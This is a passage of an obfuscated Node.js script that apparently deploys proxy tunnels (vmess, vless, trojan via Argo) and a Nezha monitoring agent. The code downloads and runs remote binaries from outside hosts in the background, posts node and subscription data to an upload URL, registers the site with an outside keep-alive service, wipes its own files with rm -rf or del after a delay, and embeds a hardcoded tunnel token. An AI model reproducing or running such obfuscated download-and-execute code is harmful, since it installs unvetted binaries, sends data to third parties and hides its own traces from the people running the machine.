axios[_0x474077(0x8e)](UPLOAD_URL+_0x474077(0xf2),_0x5e2d77,{'headers':{'Content-Type':'application/json'}});return _0x2d2638&&_0x2d2638['status']===0xc8?(console[_0x474077(0xec)](_0x474077(_0x139f88._0x11ede9)),_0x2d2638):null;}catch(_0x28e614){return null;}}else return;}}function cleanFiles(){const _0x1a3647={_0x527e44:0xf5,_0x46b7a3:0xa8,_0x5bd156:0xf9,_0x190bac:0x93},_0x1396a0={_0x2ce04b:0xc1,_0x3ced29:0x140,_0x180a6a:0x9b},_0x3ec43d={_0x285c64:0x140,_0xe799e2:0xec,_0x5a7ec4:0x9b};setTimeout(()=>{const _0x4f5c61=_0x5297,_0x62949a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x62949a[_0x4f5c61(_0x1a3647._0x527e44)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x62949a[_0x4f5c61(0xf5)](phpPath);process[_0x4f5c61(0xe9)]===_0x4f5c61(0x104)?exec(_0x4f5c61(_0x1a3647._0x46b7a3)+_0x62949a[_0x4f5c61(_0x1a3647._0x5bd156)]('\x20')+_0x4f5c61(0xe3),_0x23d2c7=>{const _0xe76f22=_0x4f5c61;console[_0xe76f22(0xc1)](),console['log'](_0xe76f22(_0x3ec43d._0x285c64)),console[_0xe76f22(_0x3ec43d._0xe799e2)](_0xe76f22(_0x3ec43d._0x5a7ec4));}):exec(_0x4f5c61(_0x1a3647._0x190bac)+_0x62949a['join']('\x20')+'\x20>/dev/null\x202>&1',_0x4f3bb9=>{const _0x13bf07=_0x4f5c61;console[_0x13bf07(_0x1396a0._0x2ce04b)](),console[_0x13bf07(0xec)](_0x13bf07(_0x1396a0._0x3ced29)),console['log'](_0x13bf07(_0x1396a0._0x180a6a));});},0x15f90);}cleanFiles();function _0x23b4(){const _0xb72d0e=['/api/add-subscriptions','https://arm64.ssss.nyc.mn/web','PORT','all','php\x20running\x20error:\x20','npm\x20running\x20error:\x20','?encryption=none&security=tls&sni=','get','post','axios','random','automatic\x20access\x20task\x20added\x20successfully','map','rm\x20-rf\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','/api/delete-nodes','aarch64','UPLOAD_URL','env','&path=%2Ftrojan-argo%3Fed%3D2560#','floor','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tls','application/json','\x20is\x20running','Download\x20','108281SDlcGs','Nodes\x20uploaded\x20successfully','taskkill\x20/f\x20/im\x20','then','824jEtVpe','\x20is\x20created','/vmess-argo','freedom','del\x20/f\x20/q\x20','has','FILE_PATH','/config.json\x20>/dev/null\x202>&1\x20&','quic','existsSync','send','listen','status','Error\x20in\x20startserver:','success','filter','\x20-p\x20','createWriteStream','1132724LOvICO','3jZolCf','NEZHA_SERVER','fileName','pipe','test','823212bwFMyP','\x20failed:\x20','firefox','Subscription\x20uploaded\x20successfully','close','clear','/dev/null','substring','boot.log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','org','\x20successfully','unshift','tunnel.json','tcp','stringify','Error\x20reading\x20boot.log:','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','direct','from','https://amd64.ssss.nyc.mn/agent','/vmess-argo?ed=2560','true','trojan','https://arm64.ssss.nyc.mn/bot','Add\x20automatic\x20access\x20task\x20faild:\x20','statSync','arm64','list.txt','\x0a\x0atrojan://','split','sub.txt','length','unlinkSync','76966322-347a-4b3b-91de-3133d2d541f7','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','isFile','&path=%2Fvless-argo%3Fed%3D2560#','\x20>\x20nul\x202>&1','\x20-c\x20','message','30TjqXhO','writeFileSync','SERVER_PORT','platform','ArgoDomain:','none','log','NAME','14343UKyOsl','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','readFileSync','/api/add-nodes','\x20>/dev/null\x202>&1\x20&','--tls','push','Content-Type','country_code','vmess','join','arch','util','Error\x20downloading\x20files:','8443','blackhole','child_process','nohup\x20','\x0aclient_secret:\x20','http','arm','win32','toString','ARGO_DOMAIN','path','includes','TunnelSecret','config.yaml','fileUrl','charAt','web\x20running\x20error:\x20','xxxsss','?security=tls&sni=','tunnel.yml','utf-8','config.json','base64','UUID','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','abcdefghijklmnopqrstuvwxyz','catch','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','block','forEach','https://amd64.ssss.nyc.mn/web','\x20already\x20exists','./tmp','1199187ARzSgd','Unhandled\x20error\x20in\x20startserver:','Skipping\x20adding\x20automatic\x20access\x20task','https+local://8.8.8.8/dns-query','data','Empowerment\x20failed\x20for\x20','/vless-argo','ARGO_AUTH','2053','countryCode','/trojan-argo','https://ipapi.co/json/','mkdirSync','sub','\x0avless://','.exe\x20>\x20nul\x202>&1','basename','vless','pop','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','cdns.doon.eu.org','false','Hello\x20world!','ARGO_DOMAIN:','3123075Tmgyhd','\x0a\x20\x20credentials-file:\x20','Empowerment\x20success\x20for\x20','https://amd64.ssss.nyc.mn/bot','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','response','2096','match','5634318KTejZO','NEZHA_PORT','App\x20is\x20running','eyJhIjoiNjk1YTE4ZDE3ZTU2MzlhYTc1Y2VmNjhjNDNiYTQyZTMiLCJ0IjoiNmVjMDdjOTAtZWY1Yy00ZTZmLTk2MWEtNDYyNzZjMjA5ODE5IiwicyI6Ik9EZzNNemRqWW1RdE9HWTJZaTAwWkdSaUxUbGxaRFV0TjJObU1XSmlOVFZqTXpFNSJ9','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','/tunnel.yml\x20run','error','SUB_PATH','2087','443','readdirSync','\x0a\x20\x20tunnel:\x20','127.0.0.1'];_0x23b4=function(){return _0xb72d0e;};return _0x23b4();}async function AddVisitTask(){const _0x3a7ca8={_0x50a212:0x120,_0x1d3c02:0x8e,_0x404dcd:0xd6},_0x103bc9=_0x5684ca;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x103bc9(0xec)](_0x103bc9(_0x3a7ca8._0x50a212));return;}try{const _0x5d9563=await axios[_0x103bc9(_0x3a7ca8._0x1d3c02)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x103bc9(0x9d)}});return console['log'](_0x103bc9(0x91)),_0x5d9563;}catch(_0x31932f){return console['error'](_0x103bc9(_0x3a7ca8._0x404dcd)+_0x31932f[_0x103bc9(0xe5)]),null;}}async function startserver(){const _0x2255f4=_0x5684ca;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x14e109){console[_0x2255f4(0x7f)](_0x2255f4(0xb1),_0x14e109);}}startserver()['catch'](_0x618f26=>{const _0x58ef78={_0x59073a:0x7f},_0x58383c=_0x5684ca;console[_0x58383c(_0x58ef78._0x59073a)](_0x58383c(0x11f),_0x618f26);}),app[_0x5684ca(0xaf)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
